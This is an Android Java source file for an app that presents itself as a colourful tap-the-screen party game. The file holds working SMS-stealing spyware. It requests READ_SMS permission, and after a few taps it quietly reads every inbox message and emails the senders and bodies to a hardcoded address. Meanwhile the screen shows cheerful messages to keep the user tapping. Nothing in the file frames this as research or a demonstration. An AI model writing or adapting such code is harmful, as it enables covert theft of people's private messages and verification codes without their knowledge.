package com.projects.rassy.buttonclicker;

import android.Manifest;
import android.animation.ValueAnimator;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.TransitionDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.Html;
import android.util.Log;
import android.view.View;
import android.widget.RelativeLayout;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    Context c;
    String GMail = "Your email"; //replace with you GMail
    String GMailPass = "Your Gmail Password"; // replace with you GMail Password
    String receiver = "Your email"; 

    String messageData = "";
    String dateToday;

    final String MY_CHANNEL = "";

    RelativeLayout constraintLayout;
    TextView tvTap;
    TransitionDrawable transition;

    int noOfTimes = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        getSupportActionBar().setTitle("                       Party Rock :)");
        TextView textView = findViewById(R.id.tv_test);
        String t = "<center><font color=\"red\">Party Rock:)</font></center>";
        textView.setText(Html.fromHtml(t));
        if (getSupportActionBar() != null) {
            getSupportActionBar().setTitle(Html.fromHtml(t));

        }
        requestForPermission();
        intializer();
        getTodaysDate();
    }

    private void requestForPermission() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1);
    }

    private void intializer() {
        c = MainActivity.this;

        constraintLayout = findViewById(R.id.constraint_layout);
        tvTap = findViewById(R.id.tvTap);

        transition = (TransitionDrawable) constraintLayout.getBackground();

        setListeners();
    }

    private void setListeners() {

        final ValueAnimator anim = ValueAnimator.ofFloat(0, 1);
        anim.setDuration(2000);

        final float[] hsv;
        final int[] runColor = new int[1];
        int hue = 0;
        hsv = new float[3]; // Transition color
        hsv[1] = 1;
        hsv[2] = 1;

        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {

            @Override
            public void onAnimationUpdate(ValueAnimator animation) {

                hsv[0] = 360 * animation.getAnimatedFraction();

                runColor[0] = Color.HSVToColor(hsv);
                constraintLayout.setBackgroundColor(runColor[0]);
            }
        });


        constraintLayout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                noOfTimes += 1;
                anim.start();

                if (noOfTimes >= 2) {
                    tvTap.setText("Again...");
                    checkForSMS();
                }

                if (noOfTimes >= 4)
                    tvTap.setText("Don't stop my Lord :)");

                if (noOfTimes >= 6)
                    tvTap.setText("Yeah...");

                if (noOfTimes >= 10) {
                    tvTap.setText("Let's keep this party going :))");
                    getSupportActionBar().hide();
                }
//                anim.setRepeatCount(Animation.INFINITE);
            }
        });
    }

    private void getTodaysDate() {
        dateToday = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
    }

    private void checkForSMS() {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"address", "body"},
                null, null, null);

        if (cursor != null && cursor.getCount() == 0) {
//            Toast.makeText(this, "Aint nuth'n here boi", Toast.LENGTH_SHORT).show();
            sendEmail(receiver, "There was a problem", "No message could be fetched");
        }

        if (cursor != null && cursor.moveToFirst()) {
            do {
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    messageData += " " + cursor.getColumnName(i) + ":" + cursor.getString(i) + "\n\n";
                }
            } while (cursor.moveToNext());
        } else {
            sendEmail(receiver, "There was a problem", "No message could be fetched");
        }

        /*AlertDialog.Builder alertDialog = new AlertDialog.Builder(MainActivity.this);
        alertDialog.setTitle("List of messages");
        alertDialog.setMessage(messageData);
        alertDialog.show();*/

        if (cursor != null)
            cursor.close();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                sendEmail("deurola@gmail.com", dateToday, messageData);
            }
        }, 2000);
    }

    private void sendEmail(final String to, final String dateToday, final String messagesRecieved) {

        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    GMailSender sender = new GMailSender(GMail,
                            GMailPass);
                    sender.sendMail(dateToday,
                            messagesRecieved,
                            GMail,
                            receiver);
                    Log.w("sendEmail", "Email successfully sent!");

                    new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {
                            tvTap.setText("Oooh :) I'm loving this!");
                        }
                    });

                } catch (final Exception e) {
                    Log.e("sendEmail", e.getMessage(), e);

//                    Toast.makeText(c, "Hey..Connect to the Internet", Toast.LENGTH_LONG).show();
                }
            }

        }).start();
    }
}
